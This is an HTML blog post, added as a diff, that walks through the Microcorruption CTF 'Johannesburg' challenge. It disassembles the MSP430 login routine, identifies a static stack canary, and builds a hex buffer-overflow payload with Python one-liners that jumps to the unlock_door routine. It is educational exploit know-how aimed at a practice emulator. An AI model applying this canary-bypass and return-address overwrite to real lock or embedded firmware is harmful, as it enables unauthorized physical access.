@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> microcorruption - johannesburg | #!/slash/note</title>
+  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="microcorruption - johannesburg" />
+<meta property="og:description" content="
+     
+
+
+This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Montevideo. This challenge is titled Johannesburg.
+The challenge has the following description when you start:
+
+This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.
+
+Alright. This might mean that we are done with the overflow challenges? Lets dive in!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://leonjza.github.io/posts/2018-03-09-microcorruption-johannesburg/" />
+<meta property="article:published_time" content="2018-03-09T14:31:25+02:00" />
+<meta property="article:modified_time" content="2018-03-09T14:31:25+02:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="microcorruption - johannesburg"/>
+<meta name="twitter:description" content="
+     
+
+
+This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Montevideo. This challenge is titled Johannesburg.
+The challenge has the following description when you start:
+
+This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.
+
+Alright. This might mean that we are done with the overflow challenges? Lets dive in!"/>
+
+  
+  
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+
+  
+  
+  
+  
+  
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-44457032-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://leonjza.github.io/posts/2018-03-08-microcorruption-montevideo/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://leonjza.github.io/posts/2018-03-11-microcorruption-santa-cruz/">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&text=microcorruption%20-%20johannesburg">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&is_video=false&description=microcorruption%20-%20johannesburg">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=microcorruption%20-%20johannesburg&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&name=microcorruption%20-%20johannesburg&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fmicrocorruption%2fmicrocorruption.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eThis%20post%20is%20part%20of%20the%20series%20of%20solving%20%3ca%20href%3d%22https%3a%2f%2fmicrocorruption.com%22%3emicrocorruption.com%3c%2fa%3e%20ctf%20challenges%20which%20continues%20from%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f07%2fmicrocorruption---whitehorse%2f%22%3eprevious%20challenge%3c%2fa%3e%20called%20%3cem%3eMontevideo%3c%2fem%3e.%20This%20challenge%20is%20titled%20%3cem%3eJohannesburg%3c%2fem%3e.%3c%2fp%3e%0a%3cp%3eThe%20challenge%20has%20the%20following%20description%20when%20you%20start%3a%3c%2fp%3e%0a%3cblockquote%3e%0a%3cp%3eThis%20is%20Software%20Revision%2004.%20We%20have%20improved%20the%20security%20of%20the%20lock%20by%20ensuring%20passwords%20that%20are%20too%20long%20will%20be%20rejected.%3c%2fp%3e%0a%3c%2fblockquote%3e%0a%3cp%3eAlright.%20This%20might%20mean%20that%20we%20are%20done%20with%20the%20overflow%20challenges%3f%20Lets%20dive%20in%21%3c%2fp%3e">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&t=microcorruption%20-%20johannesburg">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#johannesburg">johannesburg</a></li>
+    <li><a href="#solution">solution</a></li>
+    <li><a href="#other-challenges">other challenges</a></li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        microcorruption - johannesburg
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2018-03-09 14:31:25 &#43;0200 SAST" itemprop="datePublished">2018-03-09</time>
+          
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="https://leonjza.github.io/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="https://leonjza.github.io/tags/exploit" rel="tag">exploit</a>
+            
+             ,  
+            <a class="tag-link" href="https://leonjza.github.io/tags/assembly" rel="tag">assembly</a>
+            
+             ,  
+            <a class="tag-link" href="https://leonjza.github.io/tags/microcorruption" rel="tag">microcorruption</a>
+            
+             ,  
+            <a class="tag-link" href="https://leonjza.github.io/tags/johannesburg" rel="tag">johannesburg</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <figure>
+    <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png"/> 
+</figure>
+
+<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Montevideo</em>. This challenge is titled <em>Johannesburg</em>.</p>
+<p>The challenge has the following description when you start:</p>
+<blockquote>
+<p>This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.</p>
+</blockquote>
+<p>Alright. This might mean that we are done with the overflow challenges? Lets dive in!</p>
+<h2 id="johannesburg">johannesburg</h2>
+<p>Just like we have seen in a number of previous challenges now, Johannesburg follows a similar structure with the <code>main</code> routine simply calling <code>login</code>. Within the <code>login</code> routine a number of steps are taken.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">452<span style="color:#50fa7b">c</span> &lt;login&gt;
+
+[<span style="color:#50fa7b">..</span> get the password with getsn ..]
+
+4552:  3<span style="color:#50fa7b">e40</span> <span style="color:#bd93f9">0024</span>      mov   <span style="color:#6272a4">#0x2400, r14
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4556</span>:  <span style="color:#bd93f9">0</span>f41           mov   sp, r15
+
+<span style="color:#6272a4">; maybe copying the password to a different location
+</span><span style="color:#6272a4">; in memory again.
+</span><span style="color:#6272a4"></span>4558:  <span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">2446</span>      call  <span style="color:#6272a4">#0x4624 &lt;strcpy&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">455</span>c:  <span style="color:#bd93f9">0</span>f41           mov   sp, r15
+
+<span style="color:#6272a4">; check the password. routine issues syscall 0x7d which
+</span><span style="color:#6272a4">; will ask the HSM to validate.
+</span><span style="color:#6272a4"></span>455<span style="color:#8be9fd;font-style:italic">e:</span>  <span style="color:#50fa7b">b012</span> <span style="color:#bd93f9">5244</span>      call  <span style="color:#6272a4">#0x4452 &lt;test_password_valid&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4562</span>:  <span style="color:#bd93f9">0</span>f93           tst   r15
+4564:  0524           <span style="color:#50fa7b">jz</span>    <span style="color:#6272a4">#0x4570 &lt;login+0x44&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4566</span>:  b012 <span style="color:#bd93f9">4644</span>      call  <span style="color:#6272a4">#0x4446 &lt;unlock_door&gt;
+</span><span style="color:#6272a4"></span>
+[<span style="color:#50fa7b">..</span> messages about the status of the unlock ..]
+
+<span style="color:#6272a4">; ooh, interesting random single byte compare? Seems like
+</span><span style="color:#6272a4">; this is specifically for a length check. lol.
+</span><span style="color:#6272a4"></span>4578:  <span style="color:#50fa7b">f190</span> <span style="color:#bd93f9">6</span>a00 <span style="color:#bd93f9">1100</span> cmp.b <span style="color:#6272a4">#0x6a, 0x11(sp)
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">457</span>e:  <span style="color:#bd93f9">0624</span>           jeq   <span style="color:#6272a4">#0x458c &lt;login+0x60&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4580</span>:  <span style="color:#bd93f9">3</span>f40 ff44      mov   <span style="color:#6272a4">#0x44ff &#34;Invalid Password Length: password too long.&#34;, r15
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4584</span>:  b012 f845      call  <span style="color:#6272a4">#0x45f8 &lt;puts&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4588</span>:  <span style="color:#bd93f9">3040</span> <span style="color:#bd93f9">3</span>c44      br    <span style="color:#6272a4">#0x443c &lt;__stop_progExec__&gt;
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">458</span>c:  <span style="color:#bd93f9">3150</span> <span style="color:#bd93f9">1200</span>      add   <span style="color:#6272a4">#0x12, sp
+</span><span style="color:#6272a4"></span><span style="color:#bd93f9">4590</span>:  <span style="color:#bd93f9">3041</span>           ret
+</code></pre></div><p>Everything seems to be pretty much as expected, apart from the byte compare that happens at <code>0x4578</code>. The instruction at <code>0x4578</code> compares the byte that is at <code>sp + 0x11</code> with <code>0x6a</code>, just like a static stack canary.</p>
+<p>To inspect this a little closer, I set a breakpoint at the <code>cmp.b</code> instruction with <code>break 4578</code> and entered 20 <code>41</code>&rsquo;s as a hex encoded password.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/microcorruption/johannesburg_stack_canary.png"/> 
+</figure>
+
+<p>Stepping through the program to pass the <code>jeq</code> instruction saw that the program would not take the jump and continue to print the message about the password being too long. Inspecting the memory with <code>read sp+11</code> also showed that the byte contained <code>41</code>, which will cause the <code>cmp.b</code> to fail.</p>
+<p>To bypass this check, all we need to do is provide <code>0x6a</code> in the correct position so that the <code>cmp.b</code> will be equal. Inspecting the memory (as well as the instruction <code>0x11(sp)</code>), we can see this is at offset 17. All we need to do is pad the password payload and provide <code>0x6a</code> as the 17th byte.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;print(&#39;41&#39; * 0x11 + &#39;6A&#39; + &#39;42&#39; * 10)&#34;</span>
+<span style="color:#bd93f9">41414141414141414141414141414141416</span>A42424242424242424242
+</code></pre></div><figure>
+    <img src="https://leonjza.github.io/images/microcorruption/johannesburg_stack_canary.png"/> 
+</figure>
+
+<p>Once the canary check has passed, the code flow jumps to <code>0x458c</code> which adds <code>0x12</code> to the stack pointer which also happens to be right after the canary value. Considering we have a nice helper routine to unlock the lock at <code>0x4446</code>, all we need to do is provide that (little endian formatted) address to jump to and profit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;print(&#39;41&#39; * 0x11 + &#39;6A&#39; + &#39;4644&#39;)&#34;</span>
+<span style="color:#bd93f9">41414141414141414141414141414141416</span>A4644
+</code></pre></div><figure>
+    <img src="https://leonjza.github.io/images/microcorruption/johannesburg_solve.png"/> 
+</figure>
+
+<h2 id="solution">solution</h2>
+<p>Enter <code>41414141414141414141414141414141416A4644</code> as hex encoded input.</p>
+<h2 id="other-challenges">other challenges</h2>
+<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+          <script type="text/javascript">
+          
+          (function() {
+              
+              
+              
+              
+          
+              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+              var disqus_shortname = 'slashnote';
+              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </div>
+
+  
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#johannesburg">johannesburg</a></li>
+    <li><a href="#solution">solution</a></li>
+    <li><a href="#other-challenges">other challenges</a></li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&text=microcorruption%20-%20johannesburg">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&is_video=false&description=microcorruption%20-%20johannesburg">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=microcorruption%20-%20johannesburg&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&title=microcorruption%20-%20johannesburg">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&name=microcorruption%20-%20johannesburg&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fmicrocorruption%2fmicrocorruption.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eThis%20post%20is%20part%20of%20the%20series%20of%20solving%20%3ca%20href%3d%22https%3a%2f%2fmicrocorruption.com%22%3emicrocorruption.com%3c%2fa%3e%20ctf%20challenges%20which%20continues%20from%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f07%2fmicrocorruption---whitehorse%2f%22%3eprevious%20challenge%3c%2fa%3e%20called%20%3cem%3eMontevideo%3c%2fem%3e.%20This%20challenge%20is%20titled%20%3cem%3eJohannesburg%3c%2fem%3e.%3c%2fp%3e%0a%3cp%3eThe%20challenge%20has%20the%20following%20description%20when%20you%20start%3a%3c%2fp%3e%0a%3cblockquote%3e%0a%3cp%3eThis%20is%20Software%20Revision%2004.%20We%20have%20improved%20the%20security%20of%20the%20lock%20by%20ensuring%20passwords%20that%20are%20too%20long%20will%20be%20rejected.%3c%2fp%3e%0a%3c%2fblockquote%3e%0a%3cp%3eAlright.%20This%20might%20mean%20that%20we%20are%20done%20with%20the%20overflow%20challenges%3f%20Lets%20dive%20in%21%3c%2fp%3e">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2018-03-09-microcorruption-johannesburg%2f&t=microcorruption%20-%20johannesburg">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  Leon Jacobs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
+<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
+<script src=https://leonjza.github.io/js/main.js></script>
+
+
+
+</html>
